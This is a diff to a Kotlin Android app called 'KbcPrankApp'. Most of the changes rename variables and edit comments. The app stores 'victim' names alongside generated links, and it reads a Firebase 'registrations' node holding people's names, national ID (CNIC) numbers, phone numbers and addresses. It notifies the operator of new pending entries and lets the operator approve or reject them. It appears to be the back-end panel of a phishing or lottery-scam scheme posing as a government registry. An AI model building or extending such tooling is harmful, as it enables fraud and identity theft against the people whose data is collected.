@@ -45,7 +45,7 @@ import com.google.firebase.database.ValueEventListener
 import org.json.JSONArray
 import org.json.JSONObject
 
-// Safe Data Model matching your exact web portal registry schema
+// Local Cache Model
 data class LocalPrankModel(
     val id: Long,
     val victimName: String,
@@ -53,6 +53,7 @@ data class LocalPrankModel(
     val generatedLink: String
 )
 
+// Realtime Database Model matching exact schema
 data class GovtRegistryModel(
     val id: String = "",
     val name: String = "",
@@ -192,7 +193,7 @@ fun KbcPrankApp(
 ) {
     val context = LocalContext.current
     
-    // Explicitly targeting your correct Betone Live Realtime Database URL to bypass json issues
+    // Explicitly targeting your correct Realtime Database URL
     val realtimeDb = remember { 
         FirebaseDatabase.getInstance("https://betone-live-default-rtdb.firebaseio.com/")
             .getReference("registrations") 
@@ -211,7 +212,7 @@ fun KbcPrankApp(
     val govtRegistryList = remember { mutableStateListOf<GovtRegistryModel>() }
     val processedDocIds = remember { mutableStateOf(setOf<String>()) }
 
-    // Load Local History Cache
+    // Load Local Cache Links
     LaunchedEffect(Unit) {
         val savedHistory = sharedPrefs.getString("history_data", null)
         if (!savedHistory.isNullOrBlank()) {
@@ -230,7 +231,7 @@ fun KbcPrankApp(
         }
     }
 
-    // Direct Realtime Data Synchronization from registrations node
+    // Fixed Realtime Database Synchronization with child-by-child parsing
     LaunchedEffect(Unit) {
         realtimeDb.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
@@ -238,44 +239,44 @@ fun KbcPrankApp(
                 val currentBatchIds = mutableSetOf<String>()
                 
                 govtRegistryList.clear()
-                
+
                 for (child in snapshot.children) {
                     try {
                         val id = child.key ?: ""
                         
-                        // Mapping exact schema strings from your web database payload
-                        val uName = child.child("name").getValue(String::class.java) ?: ""
-                        val uCnic = child.child("cnic").getValue(String::class.java) ?: ""
-                        val uMobile = child.child("mobile").getValue(String::class.java) ?: ""
-                        val uUc = child.child("uc").getValue(String::class.java) ?: ""
-                        val uAddress = child.child("address").getValue(String::class.java) ?: ""
-                        val status = child.child("trxStatus").getValue(String::class.java) ?: "Pending"
-                        val timeStr = child.child("timestamp").getValue(String::class.java) ?: ""
+                        // Extracting individual child strings safely
+                        val name = child.child("name").getValue(String::class.java) ?: ""
+                        val cnic = child.child("cnic").getValue(String::class.java) ?: ""
+                        val mobile = child.child("mobile").getValue(String::class.java) ?: ""
+                        val uc = child.child("uc").getValue(String::class.java) ?: ""
+                        val address = child.child("address").getValue(String::class.java) ?: ""
+                        val trxStatus = child.child("trxStatus").getValue(String::class.java) ?: "Pending"
+                        val timestamp = child.child("timestamp").getValue(String::class.java) ?: ""
 
                         currentBatchIds.add(id)
-                        
+
                         govtRegistryList.add(
                             GovtRegistryModel(
                                 id = id,
-                                name = uName,
-                                cnic = uCnic,
-                                mobile = uMobile,
-                                uc = uUc,
-                                address = uAddress,
-                                trxStatus = status,
-                                timestamp = timeStr
+                                name = name,
+                                cnic = cnic,
+                                mobile = mobile,
+                                uc = uc,
+                                address = address,
+                                trxStatus = trxStatus,
+                                timestamp = timestamp
                             )
                         )
 
-                        // Notification trigger for live incoming entries
-                        if (!isFirstLoad && !processedDocIds.value.contains(id) && status == "Pending") {
-                            triggerLocalNotification(context, uName)
+                        // Trigger push notification for real-time entries
+                        if (!isFirstLoad && !processedDocIds.value.contains(id) && trxStatus == "Pending") {
+                            triggerLocalNotification(context, name)
                         }
                     } catch (e: Exception) {
                         e.printStackTrace()
                     }
                 }
-                
+
                 processedDocIds.value = currentBatchIds
             }
 
@@ -320,11 +321,11 @@ fun KbcPrankApp(
                             entry = userEntry,
                             onApprove = {
                                 realtimeDb.child(userEntry.id).child("trxStatus").setValue("Approved")
-                                    .addOnSuccessListener { Toast.makeText(context, "Status Updated: Approved", Toast.LENGTH_SHORT).show() }
+                                    .addOnSuccessListener { Toast.makeText(context, "Approved!", Toast.LENGTH_SHORT).show() }
                             },
                             onReject = {
                                 realtimeDb.child(userEntry.id).child("trxStatus").setValue("Rejected")
-                                    .addOnSuccessListener { Toast.makeText(context, "Status Updated: Rejected", Toast.LENGTH_SHORT).show() }
+                                    .addOnSuccessListener { Toast.makeText(context, "Rejected!", Toast.LENGTH_SHORT).show() }
                             }
                         )
                     }
